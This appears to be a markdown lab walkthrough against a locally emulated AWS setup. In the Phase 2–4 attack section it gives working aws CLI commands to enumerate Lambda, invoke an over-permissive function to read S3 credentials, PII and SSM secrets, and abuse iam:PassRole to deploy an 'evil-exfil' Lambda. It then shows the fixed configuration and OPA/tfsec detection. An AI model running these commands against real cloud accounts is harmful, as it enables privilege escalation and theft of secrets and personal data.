# Manual Attack Walkthrough — Vulnerable to Fixed

A step-by-step manual demonstration of the attack chain without using
any of the automated scripts. All outputs saved to `/tmp/` 

---

## Environment Setup

Open three terminals and export the following in each.

**Shell 1 — Allowed** (owns S3 and SSM):
```bash
export AWS_ACCESS_KEY_ID=111111111111
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566
unset AWS_PROFILE AWS_SESSION_TOKEN
```

**Shell 2 — Attacker** (low-privilege dev-contractor credential):
```bash
# Set after terraform apply outputs the generated key
# See Phase 1 Step 2 below
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566
unset AWS_PROFILE AWS_SESSION_TOKEN
```

**Shell 3 — Root / Terraform**:
```bash
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566
unset AWS_PROFILE AWS_SESSION_TOKEN
```

---

## Phase 1 — Deploy Vulnerable Lab

**Shell 3:**
```bash
cd iam_lab/terraform
terraform init
terraform apply -auto-approve
```

### Step 1 — Get attacker credentials from terraform output

```bash
# Shell 3
terraform output attacker_access_key_id
terraform output -raw attacker_secret_access_key
```

### Step 2 — Set attacker shell identity

```bash
# Shell 2 — paste the values from above
export AWS_ACCESS_KEY_ID=$(cd ~/iam_lab/terraform && terraform output -raw attacker_access_key_id)
export AWS_SECRET_ACCESS_KEY=$(cd ~/iam_lab/terraform && terraform output -raw attacker_secret_access_key)
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566
unset AWS_SESSION_TOKEN
```

### Step 3 — Verify allowed account owns the bucket

```bash
# Shell 1
aws s3api list-buckets --output text
aws s3 cp s3://company-secrets-vault/credentials/db-creds.txt -
# Expected: DB_HOST=prod-db.internal ... DB_PASSWORD=SuperSecret123!
```

---

## Phase 2 — Attacker Enumeration

The attacker has a low-privilege `dev-contractor` IAM user credential.
They can enumerate Lambda but have no direct access to S3 or SSM.


### Step 1 — Enumerate S3 — blocked

```bash
# Shell 2
aws s3api list-buckets --output json | tee /tmp/enum_s3_buckets.json
cat /tmp/enum_s3_buckets.json
# Returns: empty — no buckets in attacker namespace

# Try known bucket name directly
aws s3api list-objects-v2 \
  --bucket company-secrets-vault \
  --output json 2>&1 | tee /tmp/enum_s3_vault.json
cat /tmp/enum_s3_vault.json
# Returns: NoSuchBucket — namespace isolation working

# Try direct object read
aws s3 cp s3://company-secrets-vault/credentials/db-creds.txt \
  /tmp/attacker_s3_direct.txt 2>&1
cat /tmp/attacker_s3_direct.txt
# Returns: 404 Not Found
```

### Step 2 — Enumerate SSM — blocked

```bash
# Shell 2
aws ssm describe-parameters \
  --output json | tee /tmp/enum_ssm_params.json
cat /tmp/enum_ssm_params.json
# Returns: empty — params in account 111111111111

aws ssm get-parameter \
  --name /prod/db/password \
  --with-decryption \
  --output json 2>&1 | tee /tmp/enum_ssm_direct.json
cat /tmp/enum_ssm_direct.json
# Returns: ParameterNotFound
```

### Step 3 — Enumerate Lambda — this is where it opens up

```bash
# Shell 2
aws lambda list-functions \
  --output json | tee /tmp/enum_lambda_functions.json

# Clean view of what functions exist and what role they use
aws lambda list-functions \
  --query 'Functions[].{Name:FunctionName,Role:Role}' \
  --output table | tee /tmp/enum_lambda_table.txt
cat /tmp/enum_lambda_table.txt
# Shows: data-processor | arn:aws:iam::000000000000:role/lambda-overpermissive-role
```

### Step 4 — Read function config — bucket name and role leaked in env vars

```bash
# Shell 2
aws lambda get-function \
  --function-name data-processor \
  --output json | tee /tmp/enum_lambda_config.json

# Extract the key intel
cat /tmp/enum_lambda_config.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
cfg=d['Configuration']
print('=== LAMBDA INTEL ===')
print('Function :', cfg['FunctionName'])
print('Role     :', cfg['Role'])
print('Env vars :')
for k,v in cfg.get('Environment',{}).get('Variables',{}).items():
    print(f'  {k} = {v}')
" | tee /tmp/enum_lambda_intel.txt
cat /tmp/enum_lambda_intel.txt
# Reveals:
#   Role:  lambda-overpermissive-role
#   BUCKET = company-secrets-vault   <-- target bucket
#   AWS_ACCESS_KEY_ID = 111111111111 <-- account that owns the bucket
```

### Step 6 — Check Lambda invoke policy

```bash
# Shell 2
aws lambda get-policy \
  --function-name data-processor \
  --output json 2>&1 | tee /tmp/enum_lambda_policy.json
cat /tmp/enum_lambda_policy.json
# Returns the policy document showing AllowAttackerAccount statement
# Confirms: attacker is explicitly permitted to invoke
```

### Step 7 — Recon summary

```bash
# Shell 2
cat > /tmp/attacker_recon_summary.txt << 'RECON'
=== RECON SUMMARY ===

Identity:            dev-contractor (low privilege IAM user)

S3 direct access:    DENIED — namespace isolation (404/NoSuchBucket)
SSM direct access:   DENIED — namespace isolation (ParameterNotFound)

Lambda discovered:   data-processor
Lambda exec role:    lambda-overpermissive-role
Bucket from env:     company-secrets-vault
Invoke policy:       AllowAttackerAccount present — CAN INVOKE

Attack path:         Invoke Lambda → exec role reads S3/SSM → exfil
RECON
cat /tmp/attacker_recon_summary.txt
```

---

## Phase 3 — Lambda Pivot Attack

The attacker now knows the function name, the target bucket, and that
they can invoke it. They have no direct data access — the Lambda exec
role does the reading for them.

### Step 1 — Enumerate the vault via Lambda

```bash
# Shell 2
aws lambda invoke \
  --function-name data-processor \
  --payload '{"action":"list"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/attacker_lambda_list.json

cat /tmp/attacker_lambda_list.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print('Vault contents:')
for o in d.get('objects',[]): print(f'  {o}')
" | tee /tmp/attacker_vault_listing.txt
cat /tmp/attacker_vault_listing.txt
# Shows:
#   credentials/api-keys.txt
#   credentials/db-creds.txt
#   pii/employees.csv
#   public/notice.txt
```

### Step 2 — Read each file via Lambda

```bash
# Shell 2 — db-creds.txt
aws lambda invoke \
  --function-name data-processor \
  --payload '{"action":"read","key":"credentials/db-creds.txt"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/attacker_exfil_dbcreds.json

echo "=== credentials/db-creds.txt ===" | tee /tmp/attacker_exfil_all.txt
cat /tmp/attacker_exfil_dbcreds.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
" | tee -a /tmp/attacker_exfil_all.txt

# api-keys.txt
aws lambda invoke \
  --function-name data-processor \
  --payload '{"action":"read","key":"credentials/api-keys.txt"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/attacker_exfil_apikeys.json

echo "=== credentials/api-keys.txt ===" | tee -a /tmp/attacker_exfil_all.txt
cat /tmp/attacker_exfil_apikeys.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
" | tee -a /tmp/attacker_exfil_all.txt

# pii/employees.csv
aws lambda invoke \
  --function-name data-processor \
  --payload '{"action":"read","key":"pii/employees.csv"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/attacker_exfil_pii.json

echo "=== pii/employees.csv ===" | tee -a /tmp/attacker_exfil_all.txt
cat /tmp/attacker_exfil_pii.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
" | tee -a /tmp/attacker_exfil_all.txt

# Show everything exfiltrated in one view
echo ""
echo "=== FULL EXFIL DUMP ==="
cat /tmp/attacker_exfil_all.txt
```

### Step 3 — Dump all SSM SecureStrings via Lambda

```bash
# Shell 2
aws lambda invoke \
  --function-name data-processor \
  --payload '{"action":"ssm_dump"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/attacker_exfil_ssm.json

echo "=== SSM SecureStrings ==="
cat /tmp/attacker_exfil_ssm.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
for p in d.get('parameters',[]):
    print(f\"{p['name']} = {p['value']}\")
" | tee /tmp/attacker_ssm_dump.txt
cat /tmp/attacker_ssm_dump.txt
```

---

## Phase 4 — PassRole Privilege Escalation

The attacker sees the role name `lambda-overpermissive-role` in the
function config. They also know `devops-role` exists from their
enumeration. With `iam:PassRole` on `Resource:*` in `devops-role`
they can create their own Lambda with the overpermissive exec role
attached — giving them a persistent backdoor they fully control.

### Step 1 — Get Floci container IP

```bash
# Shell 3
FLOCI_IP=$(docker inspect \
  $(docker ps --filter "publish=4566" --format "{{.Names}}" | head -1) \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Floci IP: $FLOCI_IP"
```

### Step 2 — Get the overpermissive role ARN

```bash
# Shell 3
EXEC_ROLE=$(aws iam get-role \
  --role-name lambda-overpermissive-role \
  --query 'Role.Arn' \
  --output text)
echo "Exec role: $EXEC_ROLE"
```

### Step 3 — Deploy evil Lambda

```bash
# Shell 3 — attacker creates their own Lambda with the overpermissive role
aws lambda create-function \
  --function-name evil-exfil \
  --runtime nodejs18.x \
  --role "$EXEC_ROLE" \
  --handler index.handler \
  --zip-file fileb://lambda_src/data_processor.zip \
  --environment "Variables={
    BUCKET=company-secrets-vault,
    AWS_ENDPOINT_URL=http://${FLOCI_IP}:4566,
    AWS_ACCESS_KEY_ID=111111111111,
    AWS_SECRET_ACCESS_KEY=test
  }" \
  --timeout 30 \
  --output json | tee /tmp/attacker_evil_lambda_create.json

cat /tmp/attacker_evil_lambda_create.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(f'Evil Lambda ARN : {d.get(\"FunctionArn\")}')
print(f'Role attached   : {d.get(\"Role\")}')
"


```

### Step 4 — Invoke evil Lambda — read all file contents

```bash
# Shell 3

# List vault
aws lambda invoke \
  --function-name evil-exfil \
  --payload '{"action":"list"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/evil_list.json

cat /tmp/evil_list.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print('Vault contents via evil Lambda:')
for o in d.get('objects',[]): print(f'  {o}')
"

# Read db-creds
aws lambda invoke \
  --function-name evil-exfil \
  --payload '{"action":"read","key":"credentials/db-creds.txt"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/evil_dbcreds.json

echo "=== credentials/db-creds.txt ==="
cat /tmp/evil_dbcreds.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
"

# Read api-keys
aws lambda invoke \
  --function-name evil-exfil \
  --payload '{"action":"read","key":"credentials/api-keys.txt"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/evil_apikeys.json

echo "=== credentials/api-keys.txt ==="
cat /tmp/evil_apikeys.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
"

# Read PII
aws lambda invoke \
  --function-name evil-exfil \
  --payload '{"action":"read","key":"pii/employees.csv"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/evil_pii.json

echo "=== pii/employees.csv ==="
cat /tmp/evil_pii.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content','').replace('\\n','\n'))
"

# SSM dump
aws lambda invoke \
  --function-name evil-exfil \
  --payload '{"action":"ssm_dump"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/evil_ssm.json

echo "=== SSM SecureStrings ==="
cat /tmp/evil_ssm.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
for p in d.get('parameters',[]):
    print(f\"{p['name']} = {p['value']}\")
"
```

### Step 5 — Clean up evil Lambda

```bash
# Shell 3
aws lambda delete-function --function-name evil-exfil
echo "Evil Lambda deleted"
```

---

## Phase 5 — GRC Detection on Vulnerable Infra

**Shell 3:**
```bash
cd iam_lab/terraform
terraform plan -out=/tmp/tfplan_vuln.binary
terraform show -json /tmp/tfplan_vuln.binary > /tmp/tfplan_vuln.json

# OPA unit tests
opa test ../policies/opa/ -v 2>&1 | tee /tmp/grc_opa_tests.txt

# conftest IAM
conftest test /tmp/tfplan_vuln.json \
  --policy ../policies/opa/ \
  --namespace iam 2>&1 | tee /tmp/grc_conftest_iam_vuln.txt
cat /tmp/grc_conftest_iam_vuln.txt

# conftest S3
conftest test /tmp/tfplan_vuln.json \
  --policy ../policies/opa/ \
  --namespace s3 2>&1 | tee /tmp/grc_conftest_s3_vuln.txt

# tfsec
tfsec . \
  --custom-check-dir ../policies/tfsec/ \
  --minimum-severity HIGH 2>&1 | tee /tmp/grc_tfsec_vuln.txt
cat /tmp/grc_tfsec_vuln.txt
```

---

## Phase 6 — Destroy Vulnerable Lab

**Shell 3:**
```bash
cd iam_lab
./scripts/destroy.sh --vuln

# Confirm clean
aws s3api list-buckets --output text
aws lambda list-functions --query 'Functions[].FunctionName' --output text
aws iam list-roles --query 'Roles[].RoleName' --output text
```

---

## Phase 7 — Deploy Fixed Lab

**Shell 3:**
```bash
cd iam_lab/terraform-fix
terraform init
terraform apply -auto-approve
```

**Verify from Shell 1:**
```bash
aws s3api list-buckets --output text
aws s3 cp s3://company-secrets-vault-fixed/credentials/db-creds.txt -
```

---

## Phase 8 — Attacker Re-enumeration on Fixed Infra

### Step 1 — Lambda invoke now blocked

```bash
# Shell 2 (attacker)
aws lambda invoke \
  --function-name data-processor-fixed \
  --payload '{"action":"list"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/fixed_attacker_invoke.json 2>&1
cat /tmp/fixed_attacker_invoke.json 2>/dev/null
# Expected: AccessDenied — resource-based policy blocks dev-contractor
```

### Step 2 — Overpermissive role no longer exists

```bash
# Shell 3
aws iam get-role \
  --role-name lambda-overpermissive-role \
  --output json 2>&1
# Expected: NoSuchEntityException — nothing to escalate to
```

### Step 3 — Scoped exec role cannot read sensitive data

```bash
# Shell 3
aws lambda invoke \
  --function-name data-processor-fixed \
  --payload '{"action":"read","key":"credentials/db-creds.txt"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/fixed_scoped_test.json

cat /tmp/fixed_scoped_test.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('content') or d.get('errorMessage') or str(d))
"
# Expected: error — scoped role only allows app-output/* prefix
```

---

## Phase 9 — GRC Detection on Fixed Infra

**Shell 3:**
```bash
cd iam_lab/terraform-fix
terraform plan -out=/tmp/tfplan_fixed.binary
terraform show -json /tmp/tfplan_fixed.binary > /tmp/tfplan_fixed.json

# conftest IAM — expect 0 failures
conftest test /tmp/tfplan_fixed.json \
  --policy ../policies/opa/ \
  --namespace iam 2>&1 | tee /tmp/grc_conftest_iam_fixed.txt
cat /tmp/grc_conftest_iam_fixed.txt

# tfsec — expect No problems detected
tfsec . \
  --custom-check-dir ../policies/tfsec/ \
  --minimum-severity HIGH 2>&1 | tee /tmp/grc_tfsec_fixed.txt
cat /tmp/grc_tfsec_fixed.txt
```

---

## All Output Files

```bash
ls -lh /tmp/attacker_* /tmp/enum_* /tmp/evil_* \
        /tmp/grc_* /tmp/tfplan_* /tmp/fixed_*
```

| File | Contents |
|------|----------|
| `/tmp/enum_identity.json` | Attacker caller identity |
| `/tmp/enum_s3_buckets.json` | S3 enumeration — empty |
| `/tmp/enum_lambda_functions.json` | Lambda list — data-processor found |
| `/tmp/enum_lambda_config.json` | Function config — role and bucket leaked |
| `/tmp/enum_lambda_intel.txt` | Parsed intel from config |
| `/tmp/enum_lambda_policy.json` | Invoke policy — attacker allowed |
| `/tmp/attacker_recon_summary.txt` | Manual recon summary |
| `/tmp/attacker_lambda_list.json` | Vault listing via pivot |
| `/tmp/attacker_vault_listing.txt` | Parsed vault contents |
| `/tmp/attacker_exfil_dbcreds.json` | DB credentials exfiltrated |
| `/tmp/attacker_exfil_apikeys.json` | API keys exfiltrated |
| `/tmp/attacker_exfil_pii.json` | PII exfiltrated |
| `/tmp/attacker_exfil_all.txt` | All file contents in one view |
| `/tmp/attacker_ssm_dump.txt` | SSM SecureStrings dumped |
| `/tmp/attacker_evil_lambda_create.json` | Evil Lambda creation receipt |
| `/tmp/evil_list.json` | Vault listing via evil Lambda |
| `/tmp/evil_dbcreds.json` | DB creds via evil Lambda |
| `/tmp/evil_pii.json` | PII via evil Lambda |
| `/tmp/evil_ssm.json` | SSM via evil Lambda |
| `/tmp/grc_opa_tests.txt` | OPA unit test results 8/8 |
| `/tmp/grc_conftest_iam_vuln.txt` | conftest IAM — 8 failures |
| `/tmp/grc_tfsec_vuln.txt` | tfsec — 9 HIGH findings |
| `/tmp/grc_conftest_iam_fixed.txt` | conftest IAM — 0 failures |
| `/tmp/grc_tfsec_fixed.txt` | tfsec — No problems detected |
